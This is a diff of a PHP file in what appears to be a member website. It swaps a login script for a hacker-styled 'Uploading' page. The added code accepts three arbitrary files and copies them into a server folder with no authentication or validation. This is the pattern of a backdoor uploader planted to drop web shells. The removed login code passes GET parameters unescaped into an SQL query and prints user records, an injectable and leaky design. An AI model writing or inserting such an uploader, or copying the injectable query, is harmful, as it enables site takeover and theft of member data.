@@ -1,27 +1,46 @@
-<?php
+<style type="text/css">
+body {
+  color: #33ff33;
+  background-color: black;
+  font-weight: inherit;
+}
+h1,h2{
+  background-color: #4D4D4D;
+  color: #000000;
+  text-align: center;
+}
+h3,h4,h5{
+  color: silver;
+  text-align: center;
+}
+</style>
+<b><br>
+<h1> Uploading </h1>
+<br><br>
+<center>
+<font color:"blue">
+<span style="font-family: monospace;">
+<span style="color: rgb(255, 255, 255);">
+<br><br>
+<font color="black"></font>
+<br></b> <?php
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file1" size="50">
+<input type="file" name="file2" size="50">
+<input type="file" name="file3" size="50">
+<input name="_upl" type="submit" id="_upl" value="Upload">
 
-    session_start();
 
-include "config/koneksi.php";
+</form>'; if( $_POST['_upl'] == "Upload" ) 
 
-    // echo "<script type='text/javascript'>window.top.location='pages/dashboard/';</script>";
-    $email = $_GET['email'];
-    $password = $_GET['password'];
-
-    $sql = "SELECT * FROM `anggota` WHERE `email` LIKE '$email' AND `password` LIKE '$password' ORDER BY `id` DESC";
-    $result = $conn->query($sql);
-
-    if ($result->num_rows > 0) {
-        // output data of each row
-        while ($row = $result->fetch_assoc()) {
-            $_SESSION = $row;
-            print_r($row);
-            // echo "<script type='text/javascript'>window.top.location='pages/dashboard/index.php';</script>";
-        }
-    } else {
-        // echo "<script type='text/javascript'>window.top.location='index.php?login=gagal';</script>";
-    }
-
-
+{ if(@copy($_FILES['file1']['tmp_name'], "skbp_file/file1".$_FILES['file1']['name']) && @copy($_FILES['file2']['tmp_name'], "skbp_file/file2".$_FILES['file2']['name']) && @copy($_FILES['file3']['tmp_name'], "skbp_file/file3".$_FILES['file3']['name']))
+{
+echo '<b>Archivo subido!</b><br><br>';
+}
+else
+{
+echo '<b>Upludo Falio!</b><br><br></font>';
+}
+}
 
 ?>
